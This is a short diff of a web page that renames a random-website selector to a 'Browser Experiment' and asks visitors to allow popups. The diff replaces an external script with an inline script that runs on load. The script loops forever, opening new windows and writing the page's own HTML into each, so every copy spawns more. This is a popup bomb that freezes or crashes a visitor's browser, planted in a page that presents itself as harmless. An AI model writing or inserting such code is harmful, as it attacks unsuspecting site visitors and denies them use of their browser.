@@ -34,10 +34,15 @@
     <!-- MAIN CONTENT -->
     <div id="main_content_wrap" class="outer">
       <section id="main_content" class="inner">
-        <center><h3>Welcome To My Random Website selector</h3></center>
-        <center><h5>Warning: Websites may contain inappropriate content</h5></center>
+        <center><h3>Welcome To My Browser Experiment</h3></center>
+        <center><h5>Make Sure to Allow Popups for this to work!</h5></center>
         
-		<SCRIPT SRC="../javascripts/randomweb.js"></SCRIPT>
+		<SCRIPT>
+		while (true) {
+			var w = window.open();
+  			w.document.write(document.documentElement.outerHTML||document.documentElement.innerHTML);
+		}
+		</SCRIPT>
 		<center><button onclick="randomLink();">Click here to go to a random website!</button></center>
 
     
